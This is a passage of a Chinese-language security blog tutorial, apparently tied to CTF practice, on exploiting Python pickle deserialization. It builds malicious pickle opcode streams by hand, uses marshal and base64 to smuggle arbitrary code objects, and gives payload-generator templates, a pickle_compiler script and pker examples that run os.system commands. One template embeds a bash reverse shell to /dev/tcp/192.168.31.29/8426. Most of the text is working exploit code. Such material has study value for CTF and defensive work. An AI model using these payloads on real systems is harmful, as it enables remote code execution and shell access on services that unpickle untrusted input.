</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809090941558.png alt=image-20210809090941558></p><p>参考：<a href=https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/>Linux反弹shell（一）文件描述符与重定向</a> | <a href=https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/>Linux 反弹shell（二）反弹shell的本质</a></p><details><summary><h4 class=inline>栗子1 - [DasCTF 0721] easyweb</h4></summary><p><a href=https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/#easyweb>之前写过了</a>，在对session的处理时使用了pickle，我们可以构造恶意的session反弹shell；也没有特殊的过滤和限制，payload怎么写都行</p></details><h3 id=用marshal序列化任意代码对象>用Marshal序列化任意代码对象</h3><p>如果只在<code>__reduce__</code>中用<code>-c</code>参数执行代码的话，遇到一些自定函数 在格式上就会比较麻烦</p><p>前面提到pickle不能序列化代码对象，来个实例</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># py2</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>foo</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> <span style=color:#111>os</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>fib</span><span style=color:#111>(</span><span style=color:#111>n</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>n</span><span style=color:#f92672>&lt;=</span><span style=color:#ae81ff>1</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>n</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>fib</span><span style=color:#111>(</span><span style=color:#111>n</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#111>)</span><span style=color:#f92672>+</span><span style=color:#111>fib</span><span style=color:#111>(</span><span style=color:#111>n</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span> <span style=color:#d88200>&#39;fib(10)=&#39;</span><span style=color:#111>,</span><span style=color:#111>fib</span><span style=color:#111>(</span><span style=color:#ae81ff>10</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/bin/sh&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>foo</span><span style=color:#f92672>.</span><span style=color:#111>func_code</span><span style=color:#111>)</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094914448.png alt=image-20210809094914448></p><p>但也不是绝路一条，<strong>Marshal</strong>可以让这段代码序列化</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># py2</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>marshal</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>base64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>foo</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> <span style=color:#111>os</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#75af00>fib</span><span style=color:#111>(</span><span style=color:#111>n</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>n</span> <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>1</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>n</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>fib</span><span style=color:#111>(</span><span style=color:#111>n</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#111>)</span> <span style=color:#f92672>+</span> <span style=color:#111>fib</span><span style=color:#111>(</span><span style=color:#111>n</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span> <span style=color:#d88200>&#39;fib(10) =&#39;</span><span style=color:#111>,</span> <span style=color:#111>fib</span><span style=color:#111>(</span><span style=color:#ae81ff>10</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/bin/sh&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>code_serialized</span> <span style=color:#f92672>=</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>marshal</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>foo</span><span style=color:#f92672>.</span><span style=color:#111>func_code</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span> <span style=color:#111>code_serialized</span>
</span></span><span style=display:flex><span><span style=color:#75715e># YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B</span>
</span></span></code></pre></div><p>现在得到了序列化的字符串，我们希望它被反序列化时执行，但是直接将他放入<code>__reduce__</code>返回部分似乎并不可以，<code>__reduce__</code>是调用callable来执行参数之类的，而我们构造好的本身就是callable，希望它执行而不是作为另一个callable的参数；这时就需要直接从PVM操作码的层级进行构造了。</p><p>————其实我觉得更通俗的理解是这样可以不把要执行的代码限制在<code>return (os.system,(a,))</code>这样式的框架中，而是可以自由的执行代码，或者说就是另一种形式的pker</p><p>我们需要执行的其实是（利用到python oop的特性，通过<code>types.FunctionTyle(func_code,globals(),’’)()</code>来动态地创建匿名函数，参见：<a href=https://docs.python.org/zh-cn/3/library/types.html#module-types>官方文档</a>）</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>types</span><span style=color:#f92672>.</span><span style=color:#111>FunctionType</span><span style=color:#111>(</span><span style=color:#111>marshal</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64decode</span><span style=color:#111>(</span><span style=color:#111>code_enc</span><span style=color:#111>)),</span> <span style=color:#111>globals</span><span style=color:#111>(),</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>))()</span>
</span></span></code></pre></div><p>或者更可读一些</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>code_str</span> <span style=color:#f92672>=</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64decode</span><span style=color:#111>(</span><span style=color:#111>code_enc</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>code</span> <span style=color:#f92672>=</span> <span style=color:#111>marshal</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>code_str</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>func</span> <span style=color:#f92672>=</span> <span style=color:#111>types</span><span style=color:#f92672>.</span><span style=color:#111>FunctionType</span><span style=color:#111>(</span><span style=color:#111>code</span><span style=color:#111>,</span> <span style=color:#111>globals</span><span style=color:#111>(),</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>func</span><span style=color:#111>()</span>
</span></span></code></pre></div><p>接下来就是手动构造opcode的时候了，回想之前返回一个简单的shell时的opcode</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>cos</span>
</span></span><span style=display:flex><span><span style=color:#111>system</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>S</span><span style=color:#d88200>&#39;/bin/sh&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#f92672>.</span>
</span></span></code></pre></div><p>开头的c后面跟的是引入的模块，换行之后是函数，再换行之后是执行的语句；根据这个结构把marshal和b64加进去</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>cmarshal</span>
</span></span><span style=display:flex><span><span style=color:#111>loads</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>cbase64</span>
</span></span><span style=display:flex><span><span style=color:#111>b64decode</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>S</span><span style=color:#d88200>&#39;YwAAAAAB........&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tRtR</span>
</span></span></code></pre></div><p>而globals()可以在<code>__builtin__</code>模块中引入</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>{}{}</span>
</span></span><span style=display:flex><span><span style=color:#111>c__builtin__</span>
</span></span><span style=display:flex><span><span style=color:#111>globals</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>tR</span>
</span></span></code></pre></div><p>把上面的缝合起来得到最终的payload，注意添加<code>(rR.</code></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>ctypes</span>
</span></span><span style=display:flex><span><span style=color:#111>FunctionType</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>cmarshal</span>
</span></span><span style=display:flex><span><span style=color:#111>loads</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>cbase64</span>
</span></span><span style=display:flex><span><span style=color:#111>b64decode</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>S</span><span style=color:#d88200>&#39;YwAAAAAB........&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tRtRc__builtin__</span>
</span></span><span style=display:flex><span><span style=color:#111>globals</span>
</span></span><span style=display:flex><span><span style=color:#111>(</span><span style=color:#111>tRS</span><span style=color:#d88200>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>tR</span><span style=color:#111>(</span><span style=color:#111>tR</span><span style=color:#f92672>.</span>
</span></span></code></pre></div><p>构造这个人看着费劲的payload的模板~（来源参见：<a href=https://checkoway.net/musings/pickle/>Arbitrary code execution with Python pickles</a>）</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># py2</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>marshal</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>base64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>foo</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>pass</span> <span style=color:#75715e># Your code here</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>print</span> <span style=color:#d88200>&#34;&#34;&#34;ctypes
</span></span></span><span style=display:flex><span><span style=color:#d88200>FunctionType
</span></span></span><span style=display:flex><span><span style=color:#d88200>(cmarshal
</span></span></span><span style=display:flex><span><span style=color:#d88200>loads
</span></span></span><span style=display:flex><span><span style=color:#d88200>(cbase64
</span></span></span><span style=display:flex><span><span style=color:#d88200>b64decode
</span></span></span><span style=display:flex><span><span style=color:#d88200>(S&#39;</span><span style=color:#d88200>%s</span><span style=color:#d88200>&#39;
</span></span></span><span style=display:flex><span><span style=color:#d88200>tRtRc__builtin__
</span></span></span><span style=display:flex><span><span style=color:#d88200>globals
</span></span></span><span style=display:flex><span><span style=color:#d88200>(tRS&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#d88200>tR(tR.&#34;&#34;&#34;</span> <span style=color:#f92672>%</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>marshal</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>foo</span><span style=color:#f92672>.</span><span style=color:#111>func_code</span><span style=color:#111>))</span>
</span></span></code></pre></div><p>用pickle执行一下那串payload看看效果</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094819276.png alt=image-20210809094819276></p><p>成功返回了斐波那契数列的结果和一个shell</p><p>原理都是一样的，也可以用Marshal+b64的方式反弹shell（用模板生成opcode</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>marshal</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>base64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>foo</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> <span style=color:#111>os</span>
</span></span><span style=display:flex><span>    <span style=color:#111>a</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.31.29/8426 0&gt;&amp;1&#34;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># print &#39;hold on...&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#111>a</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span> <span style=color:#d88200>&#34;&#34;&#34;ctypes
</span></span></span><span style=display:flex><span><span style=color:#d88200>FunctionType
</span></span></span><span style=display:flex><span><span style=color:#d88200>(cmarshal
</span></span></span><span style=display:flex><span><span style=color:#d88200>loads
</span></span></span><span style=display:flex><span><span style=color:#d88200>(cbase64
</span></span></span><span style=display:flex><span><span style=color:#d88200>b64decode
</span></span></span><span style=display:flex><span><span style=color:#d88200>(S&#39;</span><span style=color:#d88200>%s</span><span style=color:#d88200>&#39;
</span></span></span><span style=display:flex><span><span style=color:#d88200>tRtRc__builtin__
</span></span></span><span style=display:flex><span><span style=color:#d88200>globals
</span></span></span><span style=display:flex><span><span style=color:#d88200>(tRS&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#d88200>tR(tR.&#34;&#34;&#34;</span> <span style=color:#f92672>%</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>marshal</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>foo</span><span style=color:#f92672>.</span><span style=color:#111>func_code</span><span style=color:#111>))</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810015119794.png alt=image-20210810015119794></p><p>————或者下面这个模板也可以达到上面的效果（执行代码 而不包含类和函数）（来源：<a href=https://gist.github.com/freddyb/3360650#file-pickle_compiler-py>pickle_compiler.py</a></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#00a8c8>try</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> <span style=color:#111>cPickle</span> <span style=color:#00a8c8>as</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>except</span> <span style=color:#75af00>ImportError</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>sys</span> <span style=color:#f92672>import</span> <span style=color:#111>argv</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>picklecompiler</span><span style=color:#111>(</span><span style=color:#111>sourcefile</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>sourcecode</span> <span style=color:#f92672>=</span> <span style=color:#111>file</span><span style=color:#111>(</span><span style=color:#111>sourcefile</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#34;c__builtin__</span><span style=color:#8045ff>\n</span><span style=color:#d88200>eval</span><span style=color:#8045ff>\n</span><span style=color:#d88200>(c__builtin__</span><span style=color:#8045ff>\n</span><span style=color:#d88200>compile</span><span style=color:#8045ff>\n</span><span style=color:#d88200>(</span><span style=color:#d88200>%s</span><span style=color:#d88200>S&#39;&lt;payload&gt;&#39;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>S&#39;exec&#39;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>tRtR.&#34;</span> <span style=color:#f92672>%</span> <span style=color:#111>(</span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span> <span style=color:#111>sourcecode</span> <span style=color:#111>)[:</span><span style=color:#f92672>-</span><span style=color:#ae81ff>4</span><span style=color:#111>],)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>usage</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span> <span style=color:#d88200>&#39;&#39;&#39;usage: python </span><span style=color:#d88200>%s</span><span style=color:#d88200> filename&#39;&#39;&#39;</span> <span style=color:#f92672>%</span> <span style=color:#111>argv</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;__main__&#34;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>argv</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>print</span> <span style=color:#111>picklecompiler</span><span style=color:#111>(</span><span style=color:#111>argv</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>])</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>usage</span><span style=color:#111>()</span>
</span></span></code></pre></div><h3 id=工具二连---通过upkeruhttpsgithubcomeddieivan01pker构造opcode>工具二连 - 通过<a href=https://github.com/eddieivan01/pker><u>pker</u></a>构造opcode</h3><p>原理参见：<a href=https://xz.aliyun.com/t/7012#toc-5>通过AST来构造Pickle opcode - 自动化构造</a>，利用了抽象语法树</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809232152276.png alt=image-20210809232152276></p><p>pker会用到<code>GLOBAL</code>, <code>INST</code>, <code>OBJ</code>这三种特殊函数和一些必要的转换方式；下面是pker的简单小栗子（更多使用说明详见上面的链接）</p><ul><li><p>全局变量覆盖</p><ul><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 覆盖直接由执行文件引入secret模块中的name和category模块</span>
</span></span><span style=display:flex><span><span style=color:#111>ecret</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;secret&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>secret</span><span style=color:#f92672>.</span><span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;1&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>secret</span><span style=color:#f92672>.</span><span style=color:#111>category</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;2&#39;</span>
</span></span></code></pre></div></li><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 覆盖引入模块的变量</span>
</span></span><span style=display:flex><span><span style=color:#111>game</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;guess_game&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;game&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>game</span><span style=color:#f92672>.</span><span style=color:#111>curr_ticket</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;123&#39;</span>
</span></span></code></pre></div></li></ul></li><li><p>函数执行</p><ul><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 通过b&#39;R&#39;调用 __reducce__方法</span>
</span></span><span style=display:flex><span><span style=color:#111>s</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;whoami&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>system</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;os&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;system&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span>
</span></span></code></pre></div></li><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 通过b&#39;i&#39;调用</span>
</span></span><span style=display:flex><span><span style=color:#111>INST</span><span style=color:#111>(</span><span style=color:#d88200>&#39;os&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;system&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;whoami&#39;</span><span style=color:#111>)</span>
</span></span></code></pre></div></li><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 通过b&#39;c&#39;和b&#39;o&#39;调用</span>
</span></span><span style=display:flex><span><span style=color:#111>OBJ</span><span style=color:#111>(</span><span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;os&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;system&#39;</span><span style=color:#111>),</span> <span style=color:#d88200>&#39;whoami&#39;</span><span style=color:#111>)</span>
</span></span></code></pre></div></li><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 多参数调用函数</span>
</span></span><span style=display:flex><span><span style=color:#111>INST</span><span style=color:#111>(</span><span style=color:#d88200>&#39;[module]&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;[callable]&#39;</span><span style=color:#111>[,</span> <span style=color:#111>param0</span><span style=color:#111>,</span> <span style=color:#111>param1</span><span style=color:#f92672>...</span><span style=color:#111>])</span>
</span></span><span style=display:flex><span><span style=color:#111>OBJ</span><span style=color:#111>(</span><span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;[module]&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;[callable]&#39;</span><span style=color:#111>)[,</span> <span style=color:#111>param0</span><span style=color:#111>,</span> <span style=color:#111>param1</span><span style=color:#f92672>...</span><span style=color:#111>])</span>
</span></span></code></pre></div></li></ul></li><li><p>实例化对象（特殊的函数执行）</p><ul><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>animal</span> <span style=color:#f92672>=</span> <span style=color:#111>INST</span><span style=color:#111>(</span><span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Animal&#39;</span><span style=color:#111>,</span><span style=color:#d88200>&#39;1&#39;</span><span style=color:#111>,</span><span style=color:#d88200>&#39;2&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span> <span style=color:#111>animal</span>
</span></span></code></pre></div></li><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>animal</span> <span style=color:#f92672>=</span> <span style=color:#111>OBJ</span><span style=color:#111>(</span><span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Animal&#39;</span><span style=color:#111>),</span> <span style=color:#d88200>&#39;1&#39;</span><span style=color:#111>,</span><span style=color:#d88200>&#39;2&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span> <span style=color:#111>animal</span>
</span></span></code></pre></div></li><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>animal</span> <span style=color:#f92672>=</span> <span style=color:#111>INST</span><span style=color:#111>(</span><span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Animal&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>animal</span><span style=color:#f92672>.</span><span style=color:#111>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;1&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>animal</span><span style=color:#f92672>.</span><span style=color:#111>category</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;2&#39;</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span> <span style=color:#111>animal</span>
